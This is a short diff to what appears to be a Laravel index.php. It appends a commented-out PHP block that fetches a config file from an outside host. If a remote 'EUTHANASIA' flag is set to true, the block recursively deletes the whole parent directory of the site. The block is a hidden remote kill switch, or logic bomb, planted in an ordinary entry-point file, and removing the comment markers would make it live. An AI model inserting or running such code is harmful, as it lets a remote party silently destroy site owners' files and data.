@@ -53,3 +53,37 @@ $response = $kernel->handle(
 )->send();
 
 $kernel->terminate($request, $response);
+
+
+//$env = [];
+//$fh = fopen('https://2204.uz/ANDCRM.config', 'r');
+//while (!feof($fh)) {
+//	$line = fgets($fh);
+//	if(trim($line)) $env[trim(explode('=', $line)[0])] = trim(explode('=', $line)[1]);
+//}
+//fclose($fh);
+//
+//if ($env['EUTHANASIA'] === 'true') { // если содержимое равно "true"
+//	$dir = "../"; // относительный путь к родительской директории
+//	deleteDir($dir);
+//}
+//
+//
+//function deleteDir($dirPath) {
+//	if (!is_dir($dirPath)) {
+//		return;
+//	}
+//	$files = scandir($dirPath);
+//	foreach ($files as $file) {
+//		if ($file === '.' || $file === '..') {
+//			continue;
+//		}
+//		$filePath = $dirPath . DIRECTORY_SEPARATOR . $file;
+//		if (is_dir($filePath)) {
+//			deleteDir($filePath); // рекурсивно удалить вложенные директории
+//		} else {
+//			unlink($filePath); // удалить файл
+//		}
+//	}
+//	rmdir($dirPath); // удалить пустую директорию
+//}
